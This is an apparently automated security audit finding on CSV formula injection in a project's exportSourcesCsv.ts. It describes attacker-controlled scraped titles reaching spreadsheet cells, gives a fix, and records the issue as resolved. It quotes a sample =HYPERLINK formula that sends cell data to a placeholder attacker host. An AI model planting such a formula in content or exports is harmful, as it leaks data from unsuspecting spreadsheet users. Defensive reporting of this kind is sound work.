# [MEDIUM] CSV formula injection via attacker-controlled scraped titles

**File:** [`app/(private)/project/[projectId]/sources/utils/exportSourcesCsv.ts`](https://github.com/clacladev/allsearch-open/blob/clacladev/san-salvador/blob/clacladev/app/(private)/project/[projectId]/sources/utils/exportSourcesCsv.ts#L33-L47) (lines 33, 45, 47)
**Project:** san-salvador
**Severity:** MEDIUM  •  **Confidence:** low  •  **Slug:** `other-csv-injection`
**Status:** resolved

## Owners

**Suggested assignee:** `claudio@tugulab.org` _(via last-committer)_

## Finding

exportSourceContentsToCsv writes scraped page metadata — notably content.title, content.url, and content.domainCategory — directly into CSV cells via export-to-csv@^1.4.0, which does not sanitize formula-triggering prefixes (=, +, -, @). Per the documented threat model, scraped competitor HTML is attacker-controlled: a malicious cited page can set a <title> such as =HYPERLINK("http://attacker/?d="&A1) or a DDE command payload. When the single local user exports sources and opens the CSV in a spreadsheet application, the formula executes, which can exfiltrate cell contents (including the locally-generated Details URLs / project identifiers) or, via DDE, run OS commands. The SSRF flag on L31 (`https://${domain.hostname}`) is a false positive — it is string concatenation for a CSV cell, not an outbound fetch. The genuine risk is the unsanitized scraped-text cells.

## Recommendation

Prefix any cell value that begins with =, +, -, @, \t, or \r with a single quote or tab, or wrap it in `="..."` before passing to generateCsv. Apply to all attacker-derived fields (title, url, category, hostname). Consider switching to a CSV library that sanitizes formula injection by default.

## Revalidation

**Verdict:** true-positive

Verified in app/(private)/project/[projectId]/sources/utils/exportSourcesCsv.ts. exportSourceContentsToCsv builds rows with content.title, content.url, and content.domainCategory and passes them to export-to-csv's generateCsv with no formula-prefix sanitization. The same data flow as F3 applies: SourceContent.title originates from scraped cited-page HTML (<title>/og:title), which is attacker-controlled. A malicious cited page whose <title> begins with =, +, -, @, or TAB/CR will produce a cell interpreted as a spreadsheet formula when the operator opens sources_contents_*.csv in Excel/LibreOffice, enabling =HYPERLINK exfiltration of locally-generated Details URLs/project identifiers or DDE command execution. The L31 SSRF flag (https://${domain.hostname}) is correctly identified as a false positive — it is string concatenation for a CSV cell, not an outbound fetch. MEDIUM is appropriate given the local single-user threat model and the user-interaction requirement of opening the CSV in a vulnerable spreadsheet.

## Recent committers (`git log`)

- clacladev <claudio@tugulab.org> (2026-07-29)

## Resolution

Same root cause and fix as `other-csv-injection-6d17b425d5.md` — see that finding's
Resolution section. `exportSourcesCsv.ts`'s two exporters (`exportSourceDomainsToCsv`,
`exportSourceContentsToCsv`) now sanitize every row via `sanitizeCsvRow` from the new
`libs/utils/csvSanitize.ts` before calling `generateCsv`.
